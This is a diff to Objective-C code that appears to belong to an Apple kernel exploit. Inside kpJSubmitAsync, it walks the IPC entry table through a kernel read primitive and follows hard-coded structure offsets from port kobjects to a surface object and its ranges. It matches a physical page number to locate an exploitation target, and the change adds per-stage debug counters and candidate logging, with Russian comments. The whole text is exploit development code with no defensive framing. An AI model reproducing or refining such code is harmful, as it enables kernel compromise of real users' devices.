@@ -5847,6 +5847,11 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
     }
     uint64_t surfVA = 0, rangesVA = 0;
     if (isTable) {
+        // 1.9.121: счётчики по уровням фильтра + лог первых кандидатов —
+        // прогон 1.9.120: ни один порт не дошёл до pfn-проверки, надо знать,
+        // на каком уровне умирает поиск.
+        int nKobj = 0, nColl = 0, nCnt = 0, nArr = 0, nCand = 0, nPfnMis = 0;
+        int logged = 0;
         for (uint32_t idx = 0; idx < 0x4000 && !rangesVA; idx++) {
             uint64_t eVA = isTable + (uint64_t)sizeof_ipc_entry * idx;
             uint64_t oRaw = 0, kRaw = 0;
@@ -5856,33 +5861,45 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
             if (!kpRead(portVA + off_ipc_port_ip_kobject, &kRaw, 8, "ps ip_kobj", r) || !kRaw) continue;
             uint64_t ucVA = kp_untag_ptr(kRaw);
             if (!kpLooksLikeKernelPointer(ucVA)) continue;
+            nKobj++;
             uint64_t coll = 0;
             if (!kpRead(ucVA + 0xe8, &coll, 8, "ps uc coll", r)) continue;
             coll = kp_untag_ptr(coll);
             if (!kpLooksLikeKernelPointer(coll)) continue;
+            nColl++;
             uint64_t cnt = 0;
             if (!kpRead(coll + 0xd8, &cnt, 8, "ps coll cnt", r)) continue;
             if (cnt <= dstID || cnt > 0x20000) continue;
+            nCnt++;
             uint64_t arr = 0;
             if (!kpRead(coll + 0xd0, &arr, 8, "ps coll arr", r)) continue;
             arr = kp_untag_ptr(arr);
             if (!kpLooksLikeKernelPointer(arr)) continue;
+            nArr++;
             uint64_t cand = 0;
             if (!kpRead(arr + (uint64_t)dstID * 8, &cand, 8, "ps surf ptr", r)) continue;
             cand = kp_untag_ptr(cand);
             if (!kpLooksLikeKernelPointer(cand)) continue;
+            nCand++;
             uint64_t rangeObj = 0, rq = 0;
-            if (!kpRead(cand + 0x178, &rangeObj, 8, "ps rangeObj", r)) continue;
+            BOOL rok = kpRead(cand + 0x178, &rangeObj, 8, "ps rangeObj", r);
             rangeObj = kp_untag_ptr(rangeObj);
-            if (!kpLooksLikeKernelPointer(rangeObj)) continue;
-            if (!kpRead(rangeObj + 0x18, &rq, 8, "ps ranges q", r)) continue;
-            if ((uint32_t)(rq >> 32) != pfn32 || (uint32_t)rq != 1) continue;
+            BOOL qok = rok && kpLooksLikeKernelPointer(rangeObj) && kpRead(rangeObj + 0x18, &rq, 8, "ps ranges q", r);
+            if (qok && ((uint32_t)(rq >> 32) != pfn32 || (uint32_t)rq != 1)) { nPfnMis++; qok = NO; }
+            if (logged < 5) {
+                kpNote(r, [NSString stringWithFormat:@"    кандидат idx=%#x: cnt=%llu cand=%#llx rq=%#018llx", idx,
+                          (unsigned long long)cnt, (unsigned long long)cand, (unsigned long long)rq]);
+                logged++;
+            }
+            if (!qok) continue;
             surfVA = cand;
             rangesVA = rangeObj + 0x18;
             kpNote(r, [NSString stringWithFormat:@"  ★ UC idx=%#x: surfVA=%#llx rangeObj=%#llx rangesVA=%#llx (qword=%#018llx)",
                       idx, (unsigned long long)surfVA, (unsigned long long)rangeObj,
                       (unsigned long long)rangesVA, (unsigned long long)rq]);
         }
+        kpNote(r, [NSString stringWithFormat:@"  walk-счётчики: kobj=%d coll=%d cnt=%d arr=%d cand=%d pfnMismatch=%d",
+                  nKobj, nColl, nCnt, nArr, nCand, nPfnMis]);
     }
     kpNote(r, [NSString stringWithFormat:@"  резолв: isTable=%#llx surfVA=%#llx rangesVA=%#llx",
               (unsigned long long)isTable, (unsigned long long)surfVA, (unsigned long long)rangesVA]);
